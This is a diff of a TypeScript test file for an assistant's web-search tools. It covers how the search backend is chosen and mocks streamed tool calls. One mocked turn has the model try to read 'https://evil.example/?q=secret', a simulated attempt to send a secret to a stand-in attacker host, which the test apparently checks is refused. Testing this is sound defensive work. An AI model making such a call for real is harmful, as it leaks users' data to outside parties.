@@ -48,27 +48,26 @@ test("Tavily: a search's pages, a page's text, and its errors said plainly", asy
   assert.deepEqual(urlsIn("see https://a.example/x, and http://b.example."), ["https://a.example/x", "http://b.example"]);
 });
 
-test("which web: automatic takes Tavily with its key, else Anthropic's on Claude, else none", () => {
+test("which web: Tavily with its key, on any model; off, or no key, none", () => {
   delete process.env.TAVILY_API_KEY;
-  assert.equal(webOf({ provider: "anthropic" }), "anthropic");
+  assert.equal(webOf({ provider: "anthropic" }), null);
   assert.equal(webOf({ provider: "openai" }), null);
-  assert.equal(webOf({ provider: "anthropic", web: "tavily" }), null);
   process.env.TAVILY_API_KEY = "tvly-test";
   assert.equal(webOf({ provider: "openai" }), "tavily");
   assert.equal(webOf({ provider: "anthropic" }), "tavily");
-  assert.equal(webOf({ provider: "anthropic", web: "anthropic" }), "anthropic");
+  assert.equal(webOf({ provider: "anthropic", web: "tavily" }), "tavily");
   assert.equal(webOf({ provider: "anthropic", web: "off" }), null);
   delete process.env.TAVILY_API_KEY;
 });
 
 test("through the assistant on a local model: it searches, reads a page the search found, and no other", async () => {
   process.env.TAVILY_API_KEY = "tvly-test";
-  const calls = (name: string, args: object) => sse([{ choices: [{ delta: { tool_calls: [{ index: 0, id: `c_${name}`, function: { name, arguments: JSON.stringify(args) } }] } }] }, { choices: [{ delta: {}, finish_reason: "tool_calls" }] }]);
+  const calls = (name: string, args: object) => sse([{ choices: [{ delta: { role: "assistant", tool_calls: [{ index: 0, id: `c_${name}`, function: { name, arguments: JSON.stringify(args) } }] } }] }, { choices: [{ delta: {}, finish_reason: "tool_calls" }] }]);
   const turns = [
     () => calls("web_search", { query: "simit" }),
     () => calls("read_web_page", { url: "https://evil.example/?q=secret" }),
     () => calls("read_web_page", { url: "https://example.com/simit" }),
-    () => sse([{ choices: [{ delta: { content: "About 20 lira." } }] }, { choices: [{ delta: {}, finish_reason: "stop" }] }]),
+    () => sse([{ choices: [{ delta: { role: "assistant", content: "About 20 lira." } }] }, { choices: [{ delta: {}, finish_reason: "stop" }] }]),
   ];
   let model = 0;
   const bodies: any[] = [];
